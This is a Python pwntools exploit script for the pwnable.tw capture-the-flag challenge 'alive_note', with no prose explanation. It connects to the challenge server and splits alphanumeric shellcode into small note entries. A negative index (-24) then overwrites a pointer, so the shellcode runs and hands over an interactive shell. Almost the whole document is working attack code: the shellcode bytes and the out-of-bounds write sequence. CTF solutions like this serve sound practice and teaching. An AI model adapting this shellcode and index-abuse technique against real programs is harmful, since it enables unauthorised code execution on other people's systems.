#!/usr/bin/env python
from pwn import *

addr = "chall.pwnable.tw"
port = 10300
binary = "./alive_note"

s = remote(addr, port)

def Menu():
    print s.recvuntil(" 1. Add a name")
    print s.recvuntil(" 2. show a name on the note")
    print s.recvuntil(" 3. delete a name int the note")
    print s.recvuntil(" 4. Exit")
    print s.recvuntil("Your choice :")

def Add(_index, _name):
    Menu()
    s.send("1")

    print s.recvuntil("Index :")
    s.send(_index)

    print s.recvuntil("Name :")
    s.send(_name+"\x00")

def Del(_index):
    Menu()
    s.send("3")

    sleep(0.3)
    print s.recvuntil("Index :")
    s.send(_index)

shellcode = "\x34\x50\x30\x42\x70\x50\x52\x58\x58\x30\x42\x71\x52\x58\x51\x30\x42\x53\x68\x6E\x30\x73\x68\x44\x5A\x4A\x52\x4C\x68\x30\x30\x62\x69\x5A\x4A\x52\x44\x5A\x4A\x52\x4C\x54\xAA\x51\x54\x59\x58\x50\x34\x39\x34\x32\x75\x38";

Add("0", "AAAA")
Add("1", "\x58\x30\x42\x77\x52\x58\x51\x4e")
Add("1", "\x30\x42\x56\x68\x6E\x30\x73\x68")
Add("1", "\x44\x5a\x4a\x52\x4c\x4e\x4e\x4e")
Add("1", "\x68\x30\x30\x62\x69\x5a\x4a\x52")
Add("1", "\x44\x5a\x4a\x52\x4C\x54\x53\x51")
Add("1", "\x53\x54\x59\x5a\x5a\x52\x53\x52")
Add("1", "\x58\x50\x34\x39\x34\x32\x75\x38")

Del("0")

Add("-24", "\x34\x50\x30\x42\x76\x50\x52\x58")

s.interactive()

s.close()
